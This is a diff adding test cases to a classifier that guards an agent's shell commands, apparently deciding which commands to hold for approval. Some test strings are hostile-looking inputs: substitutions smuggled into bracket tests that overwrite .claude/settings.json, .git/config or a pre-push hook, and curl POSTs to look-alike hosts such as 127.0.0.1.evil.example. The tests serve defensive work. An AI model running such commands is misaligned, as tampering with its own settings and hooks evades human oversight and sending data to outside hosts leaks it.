@@ -1780,6 +1780,75 @@ class FailClosedTests(GuardClassifyBase):
         ])
 
 
+class FollowupTests(GuardClassifyBase):
+    """Follow-up fixes B to E."""
+
+    check_rows = FailClosedTests.check_rows
+
+    def test_b_arithmetic_tests_on_a_substitution_are_read_through(self):
+        self.check_rows([
+            ('[ "$(git status --porcelain | wc -l)" -eq 0 ] && echo clean', None),
+            ("if [ $(ls | wc -l) -gt 0 ]; then echo x; fi", None),
+            ("[[ $(git rev-list --count HEAD) -ge 1 ]]", None),
+            ("test `wc -l < README.md` -lt 100", None),
+            ('[ "$(id -u)" -eq 0 ]', None),
+            ("while [ \"$(curl -s -o /dev/null -w '%{http_code}' http://localhost:8000/health)\" "
+             "-ne 200 ]; do sleep 1; done", None),
+            # a subscript holding a command is still held, and so is a substitution body that is
+            ("[[ x -eq 'a[$(echo hi > .claude/settings.json)]' ]]", "control"),
+            ("[ -v 'a[$(touch .git/hooks/pre-push)]' ]", "control"),
+            ("[[ -f .claude/settings.json && $(echo x > .git/config) ]]", "control"),
+            ('[ "$(echo hi > .claude/settings.json)" -eq 0 ]', "control"),
+            ('[ "$(rm .claude/settings.json | wc -l)" -eq 0 ]', "control"),
+        ])
+
+    def test_c_push_destination_spelled_heads_or_another_namespace(self):
+        self.check_rows([
+            ("git push origin HEAD:heads/main", "merge"),
+            ("git push origin feature:heads/main", "merge"),
+            ("git push origin +x:heads/master", "merge"),
+            ("git push origin HEAD:refs/for/main", "merge"),
+            ("git push origin HEAD:refs/remotes/origin/x", "merge"),
+            ("git push origin feature/x", None),
+            ("git push origin HEAD:refs/heads/feature/x", None),
+            ("git push origin HEAD:heads/feature/x", None),
+            ("git push origin v1.2.3", None),
+            # pushing a tag is held by its own rule, as before; it is not a merge
+            ("git push origin refs/tags/v1", "publish"),
+        ])
+
+    def test_d_gh_api_writes_in_any_option_spelling(self):
+        self.check_rows([
+            ("gh api repos/a/b/issues -ftitle=x", "publish"),
+            ("gh api repos/a/b/issues -Ftitle=x", "publish"),
+            ("gh api repos/a/b --raw-field=a=b", "publish"),
+            ("gh api repos/a/b --met DELETE", "publish"),
+            ("gh api -XDELETE repos/a/b", "publish"),
+            ("gh api repos/a/b --inp f.json", "publish"),
+            ("gh api repos/a/b/issues --fi title=x", "publish"),
+            ("gh api repos/a/b/issues --field=title=x", "publish"),
+            ("gh api -X HEAD repos/a/b", "publish"),
+            ("gh api repos/a/b", None),
+            ("gh api repos/a/b/pulls --jq '.[].number'", None),
+            ("gh api -X GET repos/a/b", None),
+            ("gh api --method GET repos/a/b -H 'Accept: x'", None),
+            ("gh api repos/a/b --paginate", None),
+            ("gh api repos/a/b --include", None),
+        ])
+
+    def test_e_local_host_is_an_exact_name_or_a_loopback_address(self):
+        self.check_rows([
+            ("curl -X POST http://127.evil.example/x -d a", "publish"),
+            ("curl -X POST http://127.0.0.1.evil.example/x -d a", "publish"),
+            ("curl -X POST http://localhost.evil.example/x -d a", "publish"),
+            ("curl -X POST http://127.0.0.1:8000/api -d '{}'", None),
+            ("curl -X POST http://localhost:8000/api -d '{}'", None),
+            ("curl -X POST http://[::1]:8000/api -d '{}'", None),
+            ("curl -X POST http://127.1.2.3/api -d x", None),
+            ("curl -X POST http://app.localhost:3000/api -d x", None),
+        ])
+
+
 class GuardEntryPresentTests(DwTestCase):
     def write(self, data):
         import json
